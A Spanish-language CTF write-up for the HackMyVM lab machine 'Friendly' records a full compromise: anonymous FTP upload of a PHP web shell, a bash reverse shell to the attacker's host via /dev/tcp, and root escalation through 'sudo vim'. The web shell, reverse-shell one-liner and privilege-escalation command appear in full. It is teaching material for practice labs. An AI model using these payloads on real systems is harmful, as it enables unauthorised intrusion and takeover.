---
title: Friendly - HackMyVM
categories: [ Linux ]
tags: [ HackMyVM ]
---

<img src="/assets/img/HMVM/Friendly/Friendly.jpg">

Holaaa! Hoy completaremos la máquina [Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly) de la plataforma [HackMyVM](https://hackmyvm.eu), el autor de la máquina es nuestro gran amigo [RiJaba1](https://www.youtube.com/@RiJaba1)! En esta máquina tocaremos los siguientes puntos:

- **Abusing FTP Anonymous user in order to upload files to the web**
- **Abusing sudoers privilege [Privilege Escalation]**

Primero que todo, y como en todas las máquinas que nos descargamos en local, tendremos que saber su IP, así que usaremos la herramienta `arp-scan` para escanear toda nuestra red local

```shell
❯ arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ed:e8:42, IPv4: 192.168.1.84
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	ac:b6:87:16:07:b9 (62:b6:87:16:07:b8)	Arcadyan Corporation
192.168.1.16	a8:93:4a:00:55:96	CHONGQING FUGUI ELECTRONICS CO.,LTD.
192.168.1.127	00:0c:29:32:5c:2f	VMware, Inc.
192.168.1.72	b2:be:76:79:1a:2c (62:b6:87:16:07:b8)	(Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.989 seconds (128.71 hosts/sec). 4 responded
```

Basandonos en el OUI (Organizationally Unique Identifier), que son las primeras 3 partes de la dirección MAC, nos percatamos que la IP 192.168.1.127 le corresponde a VMware Inc., así que esa es la IPv4 de la máquina, procederemos a escanear todo el rango de puertos con `nmap`.

```shell
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.127 -oG allPorts
Nmap scan report for 192.168.1.127
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Ahora que tenemos la captura en formato grepeable de `nmap`, así que usaremos el script en bash `extractPorts` para extraer información importante

```shell
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}

❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 192.168.1.127
   5   │     [*] Open ports: 21,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora que tenemos los puertos copiados a la clipboard, procederemos con un escaneo más exhaustivo únicamente sobre estos puertos.

```shell
❯ nmap -p21,80 -sCV 192.168.1.127 -oN targeted
Nmap scan report for friendly.home (192.168.1.127)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
```

Primero que todo, y como el mismo reporte nos muestra, el usuario `anonymous` está habilitado en el servicio FTP, así que nos conectaremos a él.

```shell
❯ ftp 192.168.1.127
Connected to 192.168.1.127.
220 ProFTPD Server (friendly) [::ffff:192.168.1.127]
Name (192.168.1.127:l4nder): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||45683|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
226 Transfer complete
ftp> 
```

Nos percatamos que hay un archivo index.html, parece ser que el servicio FTP está conectado con el servicio web, así que intentaremos subir algún archivo malicioso, intentaremos subir un archivo `cmd.php`, con el siguiente contenido:

```php
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Subiremos el archivo al servicio FTP, e iremos al servicio web, a ver si está el archivo cmd.php...

```shell
ftp> put cmd.php
local: cmd.php remote: cmd.php
229 Entering Extended Passive Mode (|||50713|)
150 Opening BINARY mode data connection for cmd.php
100% |*******************************************************************************************************************************************|    64        1.48 MiB/s    00:00 ETA
226 Transfer complete
64 bytes sent in 00:00 (71.02 KiB/s)
ftp> 
```

![](/assets/img/HMVM/Friendly/backdoor.png)

El archivo existe en el servicio web, ahora, para ver si tenemos ejecución de comandos, le concatenaremos `?cmd=whoami` al la url, quedando algo así

```html
http://192.168.1.127/cmd.php?cmd=whoami
```

![](/assets/img/HMVM/Friendly/whoami.png)

Tenemos ejecución de comandos, así que ahora nos enviaremos una reverse shell para estar más cómodo, la URL quedaría algo así

```html
http://192.168.1.127/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.84/443 0>%261"
```

```shell
❯ nc -lnvp 443
listening on [any] 443 ...
www-data@friendly:/var/www/html$ whoami
whoami
www-data
www-data@friendly:/var/www/html$ hostname
hostname
friendly
www-data@friendly:/var/www/html$ hostname -I
hostname -I
192.168.1.127 
www-data@friendly:/var/www/html$ 
```

Ahora que tenemos una shell, nos iremos al directorio `/home` para ver que usuario existen en el sistema.

```shell
www-data@friendly:/var/www/html$ cd /home/
www-data@friendly:/home$ ls
RiJaba1
www-data@friendly:/home$ 
```

Vemos que existe el usuario `RiJaba`, a ver que tiene en su directorio...

```shell
www-data@friendly:/home$ cd RiJaba1/
www-data@friendly:/home/RiJaba1$ ls 
CTF  Private  YouTube  user.txt
www-data@friendly:/home/RiJaba1$ 
```

El usuario RiJaba1 no tiene nada interesante, además de la flag, miremos permisos a nivel de sudoers.

```shell
www-data@friendly:/home/RiJaba1$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
www-data@friendly:/home/RiJaba1$ 

```

Nos percatamos que el usuario `www-data` puede ejecutar como el usuario `root` el comando `vim`, nos vamos a [GTFObins](https://gtfobins.github.io) y buscaremos el binario `vim`, se nos proporciona el siguiente comando

```shell
sudo vim -c ':!/bin/sh'
```

Lo ejecutamos, y conseguimos una shell como el usuario `root`! Hemos completado la máquina

```shell
www-data@friendly:/home/RiJaba1$ sudo vim -c ':!/bin/sh'

# whoami
root
# cd
# 
```

¡Muy buena máquina RiJaba! ¡Sigue así!